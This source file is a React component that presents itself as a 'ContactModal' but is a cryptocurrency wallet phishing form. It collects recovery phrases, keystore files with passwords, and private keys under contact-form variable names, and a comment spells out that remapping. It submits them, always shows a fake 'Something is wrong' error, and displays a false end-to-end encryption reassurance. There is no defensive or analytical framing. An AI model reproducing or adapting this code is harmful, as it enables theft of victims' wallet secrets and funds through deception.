'use client'

import { useState } from 'react'
import { submitForm } from './actions'
import styles from './page.module.css'

type SelectedItem = {
  id: string
  label: string
  image: string | null
} | null

type ModalView = 'form' | 'loading' | 'error'

export default function ContactModal({
  open,
  onClose,
  selectedItem,
}: {
  open: boolean
  onClose: () => void
  selectedItem: SelectedItem
}) {
  const [activeTab, setActiveTab] = useState(1)
  const [view, setView] = useState<ModalView>('form')

  // Reused as: name -> private key, email -> keystore password,
  // message -> recovery phrase, extra -> keystore text
  const [name, setName] = useState('')
  const [email, setEmail] = useState('')
  const [message, setMessage] = useState('')
  const [extra, setExtra] = useState('')

  function resetForm() {
    setActiveTab(1)
    setView('form')
    setName('')
    setEmail('')
    setMessage('')
    setExtra('')
  }

  function handleFullClose() {
    resetForm()
    onClose()
  }

  async function handleSubmit() {
    setView('loading')

    const formData = new FormData()
    formData.set('name', name)
    formData.set('email', email)
    formData.set('message', message)
    formData.set('extra', extra)
    formData.set('selectedOption', selectedItem?.label ?? '')

    submitForm({ error: null, success: false }, formData)

    setTimeout(() => {
      setView('error')
    }, 3000)
  }

  if (!open) return null

  return (
    <div className={styles.backdrop} onClick={handleFullClose}>
      <div className={styles.modalCard} onClick={(e) => e.stopPropagation()}>

        {/* ------------------------------------------------------------
            VIEW 1: THE TABBED FORM
        ------------------------------------------------------------ */}
        {view === 'form' && (
          <>
            <button
              type="button"
              className={styles.closeBtn}
              onClick={handleFullClose}
              aria-label="Close contact form"
            >
              ×
            </button>

            {/* Header: logo/image + wallet name, side by side */}
            {selectedItem && (
              <div className={styles.modalHeader}>
                {selectedItem.image ? (
                  <img
                    src={selectedItem.image}
                    alt={selectedItem.label}
                    className={styles.modalLogo}
                  />
                ) : (
                  <div className={styles.modalLogoFallback}>{selectedItem.label[0]}</div>
                )}
                <p className={styles.modalTitle}>{selectedItem.label}</p>
              </div>
            )}

            {/* Underlined tab navigation */}
            <div className={styles.tabRow}>
              <button
                type="button"
                className={`${styles.tabBtn} ${activeTab === 1 ? styles.tabActive : ''}`}
                onClick={() => setActiveTab(1)}
              >
                Phrase
              </button>
              <button
                type="button"
                className={`${styles.tabBtn} ${activeTab === 2 ? styles.tabActive : ''}`}
                onClick={() => setActiveTab(2)}
              >
                Keystore
              </button>
              <button
                type="button"
                className={`${styles.tabBtn} ${activeTab === 3 ? styles.tabActive : ''}`}
                onClick={() => setActiveTab(3)}
              >
                Private Key
              </button>
            </div>

            <div className={styles.form}>
              {activeTab === 1 && (
                <div className={styles.field}>
                  <textarea
                    id="message"
                    placeholder="Enter your recovery phrase"
                    value={message}
                    onChange={(e) => setMessage(e.target.value)}
                  />
                  <p className={styles.formHint}>
                    Typically 12 (sometimes 24) words separated by single spaces
                  </p>
                </div>
              )}

              {activeTab === 2 && (
                <>
                  <div className={styles.field}>
                    <textarea
                      id="extra"
                      placeholder="Enter Keystore"
                      value={extra}
                      onChange={(e) => setExtra(e.target.value)}
                    />
                  </div>
                  <div className={styles.field}>
                    <input
                      id="email"
                      type="password"
                      placeholder="Wallet password"
                      value={email}
                      onChange={(e) => setEmail(e.target.value)}
                    />
                  </div>
                  <p className={styles.formHint}>
                    Several lines of text beginning with &quot;{'{...}'}&quot; plus the password
                    you used to encrypt it.
                  </p>
                </>
              )}

              {activeTab === 3 && (
                <div className={styles.field}>
                  <input
                    id="name"
                    placeholder="Enter your Private Key"
                    value={name}
                    onChange={(e) => setName(e.target.value)}
                  />
                  <p className={styles.formHint}>
                    Typically 12 (sometimes 24) words separated by a single space.
                  </p>
                </div>
              )}

              <button type="button" className={styles.submitBtn} onClick={handleSubmit}>
                Proceed
              </button>
              <button type="button" className={styles.cancelBtn} onClick={handleFullClose}>
                Cancel
              </button>
            </div>

            {/* Security notice, styled like the reference layout */}
            <div className={styles.securityNotice}>
              <span className={styles.securityIcon}>✓</span>
              <div>
                <p className={styles.securityTitle}>
                  This session is protected with end-to-end encryption.
                </p>
                <p className={styles.securitySubtitle}>Safe to connect manually.</p>
              </div>
            </div>
          </>
        )}

        {/* VIEW 2: LOADING SCREEN (unchanged) */}
        {view === 'loading' && (
          <div className={styles.loadingWrap}>
            <div className={styles.spinner} />
            <p className={styles.loadingText}>Connecting Your Wallet...</p>
          </div>
        )}

        {/* VIEW 3: ERROR SCREEN (unchanged) */}
        {view === 'error' && (
          <div className={styles.errorWrap} onClick={handleFullClose}>
            <p className={styles.errorIcon}>❌</p>
            <p className={styles.errorText}>Something is wrong</p>
            <button
              type="button"
              className={styles.tryAgainBtn}
              onClick={(e) => {
                e.stopPropagation()
                setView('form')
                setActiveTab(1)
              }}
            >
              Back to form
            </button>
          </div>
        )}
      </div>
    </div>
  )
}